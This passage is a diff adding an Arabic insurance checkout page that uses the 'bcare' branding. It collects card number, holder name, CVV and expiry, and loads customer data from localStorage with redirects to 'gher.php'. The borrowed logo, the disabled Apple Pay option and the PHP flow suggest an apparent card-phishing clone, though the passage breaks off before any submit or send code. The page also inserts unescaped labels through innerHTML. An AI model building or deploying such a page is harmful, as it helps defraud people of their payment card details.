@@ -1,0 +1,1100 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200;300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <title>الدفع - بطاقة الائتمان</title>
+  <link rel="stylesheet" href="assets/index-C9f0agpS.css" />
+  <style>
+    .payment-loading-modal { display: none !important; }
+    .payment-loading-modal.show { display: flex !important; }
+    body { font-family: Cairo, "Segoe UI", Tahoma, Arial, sans-serif; margin: 0; padding: 0; }
+    
+    /* تحسين شكل القائمة المنسدلة */
+    select {
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+      background-image: none !important;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      border-radius: 8px !important;
+      font-weight: 500;
+    }
+    
+    select:hover {
+      background-color: #f8fafc;
+      border-color: #64748b !important;
+    }
+    
+    /* تحسين شكل القائمة عند الفتح */
+    select:focus {
+      outline: none;
+      border-color: #0a3550 !important;
+      box-shadow: 0 0 0 3px rgba(10, 53, 80, 0.1) !important;
+      background-color: white;
+    }
+    
+    /* تخصيص الخيارات */
+    select option {
+      padding: 14px;
+      background: white;
+      color: #1e293b;
+      font-size: 0.938rem;
+      font-weight: 500;
+      line-height: 1.5;
+    }
+    
+    select option:hover {
+      background: linear-gradient(135deg, #e6f0f7 0%, #d6e8f5 100%);
+    }
+    
+    select option:checked,
+    select option:focus {
+      background: #0a3550 !important;
+      color: white !important;
+      font-weight: 600;
+    }
+    
+    /* Custom Dropdown Styles */
+    .custom-select {
+      background: white;
+      transition: all 0.3s ease;
+      position: relative;
+      user-select: none;
+    }
+    
+    .custom-select:hover {
+      background-color: #f8fafc;
+      border-color: #64748b !important;
+    }
+    
+    .custom-select.active {
+      border-color: #0a3550 !important;
+      box-shadow: 0 0 0 3px rgba(10, 53, 80, 0.1);
+    }
+    
+    .custom-select .selected-value {
+      display: block;
+      color: #1e293b;
+      font-weight: 500;
+      font-size: 0.938rem;
+    }
+    
+    .custom-dropdown {
+      position: absolute;
+      bottom: 100%;
+      left: 0;
+      right: 0;
+      margin-bottom: 5px;
+      background: white;
+      border: 2px solid #0a3550;
+      border-radius: 12px;
+      box-shadow: 0 -10px 25px rgba(0, 0, 0, 0.15);
+      max-height: 280px;
+      overflow-y: auto;
+      z-index: 1000;
+      animation: slideUp 0.2s ease-out;
+    }
+    
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    .custom-dropdown-item {
+      padding: 14px 16px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-weight: 500;
+      font-size: 1rem;
+      color: #1e293b;
+      text-align: center;
+    }
+    
+    .custom-dropdown-item:hover {
+      background: linear-gradient(135deg, #e6f0f7 0%, #d6e8f5 100%);
+      color: #0a3550;
+    }
+    
+    .custom-dropdown-item.selected {
+      background: #0a3550;
+      color: white;
+      font-weight: 700;
+    }
+    
+    .custom-dropdown::-webkit-scrollbar {
+      width: 6px;
+    }
+    
+    .custom-dropdown::-webkit-scrollbar-track {
+      background: #f1f5f9;
+      border-radius: 10px;
+    }
+    
+    .custom-dropdown::-webkit-scrollbar-thumb {
+      background: #0a3550;
+      border-radius: 10px;
+    }
+    
+    /* تنسيق رسائل الخطأ */
+    .text-red-500 {
+      color: #dc2626;
+      font-size: 0.813rem;
+      font-weight: 500;
+      margin-top: 0.375rem;
+      display: block;
+    }
+    
+    .text-red-500.hidden {
+      display: none;
+    }
+    
+    /* إضافات خاصة بالتصميم */
+    .invoice-page {
+        min-height: 100vh;
+        background: #f5f7fa;
+        padding: 1rem;
+    }
+    
+    .invoice-section-wrapper {
+        max-width: 1200px;
+        margin: 0 auto;
+    }
+    
+    .invoice-info, .payment-form-container {
+        background: white;
+        border-radius: 1rem;
+        padding: 1.25rem;
+        margin-bottom: 1.25rem;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    /* عرض جانبي على الكمبيوتر */
+    @media (min-width: 1024px) {
+        .invoice-section-wrapper {
+            display: grid;
+            grid-template-columns: 400px 1fr;
+            gap: 2rem;
+            align-items: start;
+        }
+
+        .invoice-info {
+            position: sticky;
+            top: 2rem;
+        }
+
+        .payment-form-container {
+            grid-column: 2;
+        }
+
+        .invoice-info, .payment-form-container {
+            padding: 1.5rem;
+        }
+    }
+
+    /* تحسينات للموبايل - جميع الأحجام */
+    @media (max-width: 1023px) {
+        .invoice-page {
+            padding: 0.75rem;
+        }
+
+        .invoice-info, .payment-form-container {
+            padding: 1.25rem;
+            margin-bottom: 1.25rem;
+        }
+
+        /* تحسين العنوان الرئيسي */
+        .text-xl {
+            font-size: 1.125rem !important;
+            margin-bottom: 1rem !important;
+        }
+
+        /* المسافة بعد الخط الفاصل */
+        hr {
+            margin: 1rem 0 !important;
+        }
+
+        /* تحسين بطاقة التفاصيل */
+        .bg-gray-50 {
+            padding: 1rem !important;
+            margin-bottom: 1rem !important;
+        }
+
+        /* تصغير شعار الشركة */
+        #company-logo {
+            height: 2.75rem !important;
+            max-height: 2.75rem !important;
+            margin-bottom: 0.5rem !important;
+        }
+
+        .font-semibold.text-gray-800 {
+            font-size: 1rem !important;
+            margin-bottom: 0.75rem !important;
+        }
+
+        /* تحسين النصوص */
+        .text-sm {
+            font-size: 0.875rem !important;
+            line-height: 1.5 !important;
+        }
+
+        .font-medium {
+            margin-bottom: 0.75rem !important;
+        }
+
+        /* تحسين الصفوف */
+        .flex.justify-between {
+            margin-bottom: 0.75rem !important;
+        }
+
+        /* تحسين السعر الإجمالي */
+        .text-2xl {
+            font-size: 1.375rem !important;
+        }
+
+        .border-t.pt-3 {
+            padding-top: 1rem !important;
+            margin-top: 0.75rem !important;
+        }
+
+        /* تحسين عنوان طريقة الدفع */
+        .text-lg {
+            font-size: 1.125rem !important;
+            margin-bottom: 0.875rem !important;
+        }
+
+        /* تحسين أزرار طرق الدفع */
+        .flex.flex-col.gap-3 {
+            gap: 1rem !important;
+            margin-bottom: 1rem !important;
+        }
+
+        #opt-card, #opt-apple {
+            padding: 1rem !important;
+        }
+
+        #opt-card img, #opt-apple img {
+            height: 30px !important;
+        }
+
+        .font-bold {
+            font-size: 1rem !important;
+        }
+
+        /* تحسين أيقونات البطاقات الصغيرة */
+        .flex.justify-end.gap-2 {
+            margin-top: 1rem !important;
+            gap: 0.5rem !important;
+        }
+
+        .flex.justify-end.gap-2 img {
+            width: 34px !important;
+            height: 22px !important;
+        }
+
+        /* تحسين النموذج */
+        .space-y-4 {
+            margin-top: 1rem !important;
+        }
+
+        .space-y-4 > * + * {
+            margin-top: 1rem !important;
+        }
+
+        /* تحسين Labels */
+        label {
+            font-size: 0.875rem !important;
+            margin-bottom: 0.5rem !important;
+            display: block !important;
+        }
+
+        /* تحسين حقول الإدخال */
+.w-full.px-4.py-2 {
+    padding: 0.75rem 1rem !important;
+    font-size: 0.938rem !important;
+    position: relative;
+    top: -10px; 
+}
+
+        input, select {
+            border-radius: 0.5rem !important;
+        }
+
+        /* تحسين grid التاريخ و CVV */
+        .grid.grid-cols-3 {
+            gap: 0.75rem !important;
+            grid-template-columns: 1fr 1fr 1fr !important;
+        }
+
+        .grid.grid-cols-3 > div {
+            min-width: 0 !important;
+        }
+
+        /* زر الدفع */
+        #btn-pay {
+            padding: 1rem !important;
+            font-size: 1.125rem !important;
+            margin-top: 1.5rem !important;
+            border-radius: 0.625rem !important;
+        }
+
+        /* تحسين قسم الأمان */
+        .flex.flex-col.items-center {
+            margin-top: 1.25rem !important;
+            gap: 0.75rem !important;
+        }
+
+        .flex.flex-col.items-center img {
+            height: 2rem !important;
+        }
+
+        .h-4 {
+            height: 1rem !important;
+            width: 1rem !important;
+        }
+
+        .mx-2 {
+            font-size: 0.875rem !important;
+        }
+
+        /* رسالة الخطأ لـ Apple Pay */
+        #apple-pay-err {
+            margin-top: 0.75rem !important;
+            padding: 0.75rem !important;
+            border-radius: 0.5rem !important;
+            background: #fee2e2 !important;
+        }
+    }
+
+    /* للشاشات المتوسطة (الهواتف الكبيرة والتابلت الصغير) */
+    @media (min-width: 640px) and (max-width: 1023px) {
+        .invoice-page {
+            padding: 1.25rem;
+        }
+
+        .invoice-info, .payment-form-container {
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .text-xl {
+            font-size: 1.25rem !important;
+        }
+
+        .text-2xl {
+            font-size: 1.5rem !important;
+        }
+
+        #btn-pay {
+            font-size: 1.25rem !important;
+        }
+    }
+
+    /* للشاشات الصغيرة (الهواتف العادية) */
+    @media (max-width: 639px) {
+        .invoice-page {
+            padding: 0.5rem;
+        }
+
+        .invoice-info, .payment-form-container {
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border-radius: 0.75rem;
+        }
+
+        .bg-gray-50 {
+            padding: 0.875rem !important;
+        }
+
+        #company-logo {
+            height: 2.5rem !important;
+        }
+    }
+
+    /* للشاشات الصغيرة جداً */
+    @media (max-width: 375px) {
+        .invoice-page {
+            padding: 0.375rem;
+        }
+
+        .invoice-info, .payment-form-container {
+            padding: 0.875rem;
+            border-radius: 0.625rem;
+            margin-bottom: 0.875rem;
+        }
+
+        .bg-gray-50 {
+            padding: 0.75rem !important;
+        }
+
+        .text-xl {
+            font-size: 1rem !important;
+        }
+
+        #company-logo {
+            height: 2.25rem !important;
+        }
+
+        .font-semibold.text-gray-800 {
+            font-size: 0.938rem !important;
+        }
+
+        .text-sm {
+            font-size: 0.813rem !important;
+        }
+
+        .text-2xl {
+            font-size: 1.25rem !important;
+        }
+
+        #opt-card, #opt-apple {
+            padding: 0.875rem !important;
+        }
+
+        #opt-card img, #opt-apple img {
+            height: 26px !important;
+        }
+
+        .w-full.px-4.py-2 {
+            padding: 0.625rem 0.875rem !important;
+            font-size: 0.875rem !important;
+        }
+
+        label {
+            font-size: 0.813rem !important;
+        }
+
+        .grid.grid-cols-3 {
+            gap: 0.5rem !important;
+        }
+
+        #btn-pay {
+            padding: 0.875rem !important;
+            font-size: 1rem !important;
+        }
+    }
+
+    /* للشاشات الصغيرة جداً جداً (iPhone SE, Galaxy Fold مطوي) */
+    @media (max-width: 320px) {
+        .invoice-page {
+            padding: 0.25rem;
+        }
+
+        .invoice-info, .payment-form-container {
+            padding: 0.75rem;
+        }
+
+        .text-xl {
+            font-size: 0.938rem !important;
+        }
+
+        .text-sm {
+            font-size: 0.75rem !important;
+        }
+
+        .text-2xl {
+            font-size: 1.125rem !important;
+        }
+
+        #company-logo {
+            height: 2rem !important;
+        }
+
+        #btn-pay {
+            font-size: 0.938rem !important;
+            padding: 0.75rem !important;
+        }
+
+        .grid.grid-cols-3 {
+            grid-template-columns: 0.8fr 1fr 0.9fr !important;
+        }
+    }
+  </style>
+</head>
+<body>
+  <!-- شريط التنقل -->
+  <nav dir="rtl" class="bg-white shadow-sm border-b">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
+      <div class="flex flex-wrap justify-between items-center gap-4">
+        <div class="flex items-center gap-3">
+          <button type="button" class="p-2 rounded-md text-[#00322B] hover:text-[#00FFD0] focus:outline-none" aria-label="Toggle menu">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="18" y2="18"/></svg>
+          </button>
+          <a href="#" class="text-2xl sm:text-3xl font-bold text-[#00322B]">
+            <img src="/bcare-logo.svg" alt="bcare" width="90" height="45">
+          </a>
+        </div>
+        <div class="flex items-center gap-3">
+          <a href="#" class="px-5 py-2 bg-[#00FFB3] text-[#00322B] font-medium rounded-full text-sm sm:text-base whitespace-nowrap">أمن الأن</a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <div class="invoice-page" dir="rtl">
+    <div class="invoice-section-wrapper">
+      <!-- ملخص الدفع -->
+      <div class="invoice-info">
+        <div class="text-center mb-6">
+          <h5 class="text-xl font-semibold text-gray-800">تفاصيل الدفع</h5>
+          <hr class="mt-4 border-gray-300" />
+        </div>
+        <div class="bg-gray-50 rounded-lg p-4 mb-6 border rounded-lg transition-all duration-200 border-blue-500 bg-blue-50">
+          <div class="mb-3">
+            <div class="flex flex-col items-center mb-2">
+              <img src="" alt="الشركة" class="h-12 mr-3 object-contain" id="company-logo" />
+              <span class="font-semibold text-gray-800" id="company-name">تأمين المركبات</span>
+            </div>
+            <div class="text-sm text-gray-600 mb-3">
+              <div class="font-medium mb-1">فترة التأمين:</div>
+              <div class="flex justify-between"><span>تاريخ البداية:</span><span id="d-start">—</span></div>
+              <div class="flex justify-between"><span>تاريخ الانتهاء:</span><span id="d-end">—</span></div>
+            </div>
+            
+            <!-- الخدمات المختارة -->
+            <div id="selected-services-wrapper" style="display:none;">
+              <div class="font-medium mb-1">الخدمات المختارة:</div>
+              <div id="selected-services-list"></div>
+              <div style="height: 1rem;"></div>
+            </div>
+          </div>
+          
+          <div class="text-sm text-gray-600 mb-3">
+            <div class="font-medium mb-2">تفاصيل السعر:</div>
+            <div class="flex justify-between mb-1">
+              <span>القسط الأساسي:</span><span><span id="row-base">0.00</span> ريال</span>
+            </div>
+            <div class="flex justify-between mb-1" id="additional-services-row" style="display:none;">
+              <span>الخدمات الإضافية:</span><span><span id="row-services-total">0.00</span> ريال</span>
+            </div>
+            <div class="flex justify-between mb-1" style="color: #10b981;">
+              <span>خصم عدم وجود مطالبات:</span><span>-<span id="row-discount">75.30</span> ريال</span>
+            </div>
+            <div class="flex justify-between mb-1 font-medium border-t pt-2 mt-2">
+              <span>المجموع الفرعي:</span><span><span id="row-sub">0.00</span> ريال</span>
+            </div>
+            <div class="flex justify-between mb-1">
+              <span>ضريبة القيمة المضافة (15%):</span><span><span id="row-vat">0.00</span> ريال</span>
+            </div>
+          </div>
+          <div class="flex justify-between items-center border-t pt-3">
+            <span class="text-gray-600 font-bold">المبلغ الإجمالي:</span>
+            <span class="text-2xl font-bold" style="color:#0a3550"><span id="row-total">0.00</span> ريال</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="payment-form-container">
+        <div class="mb-6">
+          <div class="mb-6">
+            <div class="text-lg font-bold leading-7 text-foreground/80">اختر طريقة الدفع</div>
+          </div>
+          <div class="flex flex-col gap-3">
+            <div id="opt-card" class="border rounded-lg p-4 cursor-pointer transition-all duration-200 border-blue-500 bg-blue-50" role="button" tabindex="0">
+              <div class="flex items-center justify-between">
+                <img src="assets/cards-DEvwsDKR.webp" style="height:36px" width="180" height="36" alt="cards" />
+                <div class="font-bold" id="card-option-amount">0.00 ر.س</div>
+              </div>
+            </div>
+            <div id="opt-apple" class="border rounded-lg p-4 cursor-pointer transition-all duration-200 border-gray-200 hover:border-gray-300" role="button" tabindex="0">
+              <div class="flex items-center justify-between">
+                <img src="https://cdn2.downdetector.com/static/uploads/logo/apple-pay.png" style="height:36px" width="120" height="36" alt="apple" />
+              </div>
+            </div>
+          </div>
+          <div id="apple-pay-err" class="text-red-600 text-sm mt-3 hidden">عذراً الدفع عن طريق أبل غير متوفر حاليا</div>
+          <hr class="my-4" />
+          <div id="form-anchor"></div>
+          <h5 class="flex justify-end gap-2 items-center text-xs font-semibold leading-none text-gray-500 w-full">
+            <img src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 4a4 4 0 0 1 4-4h30a4 4 0 0 1 4 4v17a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V4Z' fill='%23fff'/%3E%3Cpath d='M15.215 5.85h7.57v13.604h-7.57V5.851Z' fill='%23FF5F00'/%3E%3Cpath d='M15.695 12.652a8.675 8.675 0 0 1 3.293-6.801A8.6 8.6 0 0 0 13.652 4 8.647 8.647 0 0 0 5 12.652a8.647 8.647 0 0 0 8.652 8.653 8.6 8.6 0 0 0 5.336-1.85 8.64 8.64 0 0 1-3.293-6.803Z' fill='%23EB001B'/%3E%3Cpath d='M33 12.652a8.647 8.647 0 0 1-8.652 8.653 8.6 8.6 0 0 1-5.336-1.85 8.603 8.603 0 0 0 3.293-6.803 8.675 8.675 0 0 0-3.293-6.801A8.6 8.6 0 0 1 24.348 4C29.13 4 33 7.894 33 12.652Z' fill='%23F79E1B'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E" width="38" height="25" alt="" />
+            <img src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='38' height='25' rx='4' fill='%23fff'/%3E%3Cpath d='m15.631 8.16-3.666 8.808H9.573L7.77 9.94c-.109-.433-.204-.592-.538-.774C6.687 8.87 5.79 8.59 5 8.417l.054-.255h3.85c.49 0 .932.329 1.043.898l.952 5.097 2.355-5.995 2.377-.002Zm9.37 5.934c.01-2.325-3.192-2.453-3.17-3.492.007-.315.306-.652.96-.737.323-.042 1.217-.075 2.229.394l.397-1.868A6.059 6.059 0 0 0 23.3 8c-2.236 0-3.811 1.197-3.824 2.91-.015 1.268 1.123 1.976 1.98 2.398.883.431 1.179.71 1.174 1.094-.006.59-.703.852-1.355.862-1.137.018-1.796-.31-2.323-.557l-.41 1.93c.529.244 1.506.457 2.516.469 2.38.001 3.935-1.183 3.942-3.013Zm5.906 2.875H33L31.173 8.16h-1.931c-.435 0-.8.254-.963.646l-3.395 8.162h2.376l.471-1.316h2.904l.272 1.317Zm-2.524-3.12 1.191-3.308.686 3.307h-1.877Zm-9.52-5.689-1.871 8.808H14.73l1.871-8.808h2.262Z' fill='%231434CB'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E" width="38" height="25" alt="" />
+            <img src="assets/mada-with-border-CettaOB4.png" width="38" height="25" alt="mada" />
+          </h5>
+        </div>
+
+        <form id="pay-form" class="space-y-4 mt-4">
+          <div>
+            <label class="block text-[#000000] text-sm font-medium mb-1" for="card-number">رقم البطاقة</label>
+            <div class="relative flex items-center">
+              <input id="card-number" name="card-number" type="text" placeholder="1234 1234 1234 1234" maxlength="19" required dir="ltr" style="text-align:left" inputmode="numeric"
+                class="w-full px-4 py-2 border focus:ring-0 focus:border-[#c0c0c0] outline-none transition-all duration-200 border-[#e0e0e0]" />
+              <div class="absolute right-3 top-1/2 transform -translate-y-1/2 text-secondary-500 z-10" id="card-brand-slot"></div>
+            </div>
+            <p id="err-card" class="text-red-500 text-sm mt-1 hidden"></p>
+          </div>
+          <div style="margin-top: 0.75rem;">
+            <label class="block text-[#000000] text-sm font-medium mb-1" for="card-holder-name">اسم صاحب البطاقة</label>
+            <input id="card-holder-name" name="card-holder-name" type="text" placeholder="الأسم على البطاقة (بالإنجليزية)" required
+              class="w-full px-4 py-2 border focus:ring-0 focus:border-[#c0c0c0] outline-none transition-all duration-200 border-[#e0e0e0]" />
+            <p id="err-name" class="text-red-500 text-sm mt-1 hidden"></p>
+          </div>
+          <div class="grid grid-cols-3 gap-1" style="margin-top: 0.5rem;">
+            <label class="block text-[#000000] text-sm font-medium mb-1">رمز (cvv)</label>
+            <label class="block text-[#000000] text-sm font-medium mb-1">تاريخ الانتهاء</label>
+            <label class="block text-[#000000] text-sm font-medium mb-1"></label>
+            <div>
+              <div class="relative flex items-center">
+                <input id="card-cvv" name="card-cvv" type="password" placeholder="***" maxlength="4" required dir="ltr" style="text-align:left" inputmode="numeric"
+                  class="w-full px-4 py-2 border focus:ring-0 focus:border-[#c0c0c0] outline-none transition-all duration-200 border-[#e0e0e0]" />
+              </div>
+              <p id="err-cvv" class="text-red-500 text-sm mt-1 hidden"></p>
+            </div>
+            <div class="custom-select-wrapper" style="position: relative;">
+              <div id="year-select" class="custom-select w-full px-4 py-2 border border-[#e0e0e0] cursor-pointer" style="border-radius: 8px;">
+                <span class="selected-value">سنة</span>
+              </div>
+              <div id="year-dropdown" class="custom-dropdown" style="display: none;">
+                <!-- سيتم ملؤها بالـ JavaScript -->
+              </div>
+              <input type="hidden" id="expiry-year" name="expiry-year" required />
+              <p id="err-y" class="text-red-500 text-sm mt-1 hidden"></p>
+            </div>
+            <div class="custom-select-wrapper" style="position: relative;">
+              <div id="month-select" class="custom-select w-full px-4 py-2 border border-[#e0e0e0] cursor-pointer" style="border-radius: 8px;">
+                <span class="selected-value">الشهر</span>
+              </div>
+              <div id="month-dropdown" class="custom-dropdown" style="display: none;">
+                <!-- سيتم ملؤها بالـ JavaScript -->
+              </div>
+              <input type="hidden" id="expiry-month" name="expiry-month" required />
+              <p id="err-m" class="text-red-500 text-sm mt-1 hidden"></p>
+            </div>
+          </div>
+          <button type="submit" id="btn-pay" class="w-full py-2 transition-colors duration-200 font-bold text-lg mt-6 btn bg-blue-500 hover:bg-blue-600 text-white btn-large text-white">
+            ادفع الآن - <span id="btn-amount">0.00</span> ر.س
+          </button>
+        </form>
+
+        <div class="flex flex-col items-center justify-center mt-6 text-sm text-gray-600">
+          <img src="assets/cards-all-BF_GftTO.png" alt="security" class="h-8 mr-2" />
+          <div class="flex items-center justify-center w-full">
+            <svg class="h-4 text-green-500 mt-2" focusable="false" aria-hidden="true" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2m-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2m3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1z" fill="currentColor"></path>
+            </svg>
+            <p class="MuiTypography-root MuiTypography-body1 mui-rtl-pxrsyw"><span class="mx-2">دفع آمن وسريع</span></p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="pay-modal" class="payment-loading-modal" role="dialog" aria-modal="true">
+    <div class="payment-loading-content">
+      <div class="loading-spinner"></div>
+      <h3>جاري معالجة الدفع...</h3>
+      <p>يرجى الانتظار بينما يتم معالجة بياناتك</p>
+    </div>
+  </div>
+
+  <script>
+(function () {
+  // Luhn Algorithm
+  function luhnCheck(cardNumber) {
+    cardNumber = cardNumber.replace(/\s/g, '');
+    if (!/^\d+$/.test(cardNumber)) return false;
+    let sum = 0, isEven = false;
+    for (let i = cardNumber.length - 1; i >= 0; i--) {
+      let digit = parseInt(cardNumber[i]);
+      if (isEven) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+      isEven = !isEven;
+    }
+    return (sum % 10) === 0;
+  }
+
+  var visaSvg = "data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='38' height='25' rx='4' fill='%23fff'/%3E%3Cpath d='m15.631 8.16-3.666 8.808H9.573L7.77 9.94c-.109-.433-.204-.592-.538-.774C6.687 8.87 5.79 8.59 5 8.417l.054-.255h3.85c.49 0 .932.329 1.043.898l.952 5.097 2.355-5.995 2.377-.002Zm9.37 5.934c.01-2.325-3.192-2.453-3.17-3.492.007-.315.306-.652.96-.737.323-.042 1.217-.075 2.229.394l.397-1.868A6.059 6.059 0 0 0 23.3 8c-2.236 0-3.811 1.197-3.824 2.91-.015 1.268 1.123 1.976 1.98 2.398.883.431 1.179.71 1.174 1.094-.006.59-.703.852-1.355.862-1.137.018-1.796-.31-2.323-.557l-.41 1.93c.529.244 1.506.457 2.516.469 2.38.001 3.935-1.183 3.942-3.013Zm5.906 2.875H33L31.173 8.16h-1.931c-.435 0-.8.254-.963.646l-3.395 8.162h2.376l.471-1.316h2.904l.272 1.317Zm-2.524-3.12 1.191-3.308.686 3.307h-1.877Zm-9.52-5.689-1.871 8.808H14.73l1.871-8.808h2.262Z' fill='%231434CB'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E";
+  
+  function brandForPan(pan) {
+    var d = String(pan || "").replace(/\s/g, "");
+    if (d.charAt(0) === "4") return visaSvg;
+    if (d.charAt(0) === "5" || d.charAt(0) === "2") return "assets/MASTERCARD-c-cbvoz1.png";
+    return "";
+  }
+  
+  function fmtPan(v) {
+    var d = v.replace(/\s+/g, "").replace(/[^0-9]/g, "");
+    var m = d.match(/\d{4,16}/g);
+    var w = m && m[0] || d;
+    var o = [];
+    for (var i = 0; i < w.length; i += 4) o.push(w.substring(i, i + 4));
+    return o.length ? o.join(" ") : d;
+  }
+
+  // Custom Dropdown للشهر والسنة
+  function createCustomDropdown(selectId, dropdownId, hiddenInputId, items) {
+    const selectEl = document.getElementById(selectId);
+    const dropdownEl = document.getElementById(dropdownId);
+    const hiddenInput = document.getElementById(hiddenInputId);
+    const selectedValueEl = selectEl.querySelector('.selected-value');
+    
+    // ملء القائمة
+    items.forEach(item => {
+      const div = document.createElement('div');
+      div.className = 'custom-dropdown-item';
+      div.textContent = item.label;
+      div.dataset.value = item.value;
+      div.addEventListener('click', function() {
+        selectedValueEl.textContent = item.label;
+        hiddenInput.value = item.value;
+        dropdownEl.style.display = 'none';
+        selectEl.classList.remove('active');
+        
+        // إزالة selected من الكل وإضافتها للمختار
+        dropdownEl.querySelectorAll('.custom-dropdown-item').forEach(i => i.classList.remove('selected'));
+        this.classList.add('selected');
+      });
+      dropdownEl.appendChild(div);
+    });
+    
+    // فتح/إغلاق القائمة
+    selectEl.addEventListener('click', function(e) {
+      e.stopPropagation();
+      const isOpen = dropdownEl.style.display === 'block';
+      
+      // إغلاق جميع القوائم الأخرى
+      document.querySelectorAll('.custom-dropdown').forEach(d => d.style.display = 'none');
+      document.querySelectorAll('.custom-select').forEach(s => s.classList.remove('active'));
+      
+      if (!isOpen) {
+        dropdownEl.style.display = 'block';
+        selectEl.classList.add('active');
+      }
+    });
+  }
+  
+  // إغلاق القوائم عند النقر في أي مكان
+  document.addEventListener('click', function() {
+    document.querySelectorAll('.custom-dropdown').forEach(d => d.style.display = 'none');
+    document.querySelectorAll('.custom-select').forEach(s => s.classList.remove('active'));
+  });
+  
+  // إنشاء قائمة الأشهر
+  const months = [];
+  for (let m = 1; m <= 12; m++) {
+    const mm = m < 10 ? '0' + m : '' + m;
+    months.push({ value: mm, label: mm });
+  }
+  createCustomDropdown('month-select', 'month-dropdown', 'expiry-month', months);
+  
+  // إنشاء قائمة السنوات
+  const years = [];
+  const currentYear = new Date().getFullYear();
+  for (let y = 0; y <= 20; y++) {
+    const fullYear = currentYear + y;
+    const shortYear = String(fullYear).slice(-2);
+    years.push({ value: shortYear, label: String(fullYear) });
+  }
+  createCustomDropdown('year-select', 'year-dropdown', 'expiry-year', years);
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const userIdFromUrl = urlParams.get('user_id') || '';
+  
+  console.log('=== فحص localStorage ===');
+  console.log('localStorage.insurance_data:', localStorage.getItem('insurance_data'));
+  console.log('localStorage.customer_data:', localStorage.getItem('customer_data'));
+  
+  const raw = localStorage.getItem('insurance_data');
+  
+  if(!raw){ 
+    console.error('❌ لا توجد بيانات تأمين في localStorage!');
+    alert('يرجى اختيار عرض التأمين أولاً'); 
+    window.location.href = userIdFromUrl ? `gher.php?user_id=${userIdFromUrl}` : 'gher.php'; 
+  }
+  
+  let ins = {};
+  try{ 
+    ins = JSON.parse(raw)||{}; 
+    console.log('✅ تم قراءة بيانات التأمين:', ins);
+  }catch(e){ 
+    console.error('❌ خطأ في قراءة JSON:', e);
+    alert('تعذر قراءة بيانات التأمين'); 
+    window.location.href = userIdFromUrl ? `gher.php?user_id=${userIdFromUrl}` : 'gher.php'; 
+  }
+
+  const customerData = JSON.parse(localStorage.getItem('customer_data') || '{}');
+  
+  // تشخيص البيانات
+  console.log('=== تشخيص البيانات ===');
+  console.log('insurance_data:', ins);
+  console.log('customer_data:', customerData);
+  console.log('policy_start_date:', customerData.policy_start_date);
+  console.log('applicant_name:', customerData.applicant_name);
+  console.log('phone_number:', customerData.phone_number);
+
+  function pad2(n) { return n < 10 ? "0" + n : "" + n; }
+  function fmtArDate(iso) {
+    try {
+      var d = new Date(iso);
+      return d.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" });
+    } catch (e) { return iso; }
+  }
+
+  // عرض البيانات
+  document.getElementById('company-logo').src = ins.logo || '';
+  document.getElementById('company-name').textContent = ins.company || 'شركة التأمين';
+  
+  // حساب مجموع الخدمات الإضافية
+  let servicesTotal = 0;
+  const selectedServicesList = document.getElementById('selected-services-list');
+  const selectedServicesWrapper = document.getElementById('selected-services-wrapper');
+  const additionalServicesRow = document.getElementById('additional-services-row');
+  
+  if (ins.features && ins.features.length > 0) {
+    // عرض قائمة الخدمات المختارة
+    selectedServicesWrapper.style.display = 'block';
+    ins.features.forEach(feature => {
+      const serviceDiv = document.createElement('div');
+      serviceDiv.className = 'text-sm mb-1 flex justify-between';
+      serviceDiv.innerHTML = `<span>• ${feature.label}</span><span style="font-weight: 600;">${feature.price.toFixed(2)} ريال</span>`;
+      selectedServicesList.appendChild(serviceDiv);
+      servicesTotal += feature.price;
+    });
+    
+    // عرض مجموع الخدمات في تفاصيل السعر
+    additionalServicesRow.style.display = 'flex';
+    document.getElementById('row-services-total').textContent = servicesTotal.toFixed(2);
+  }
+  
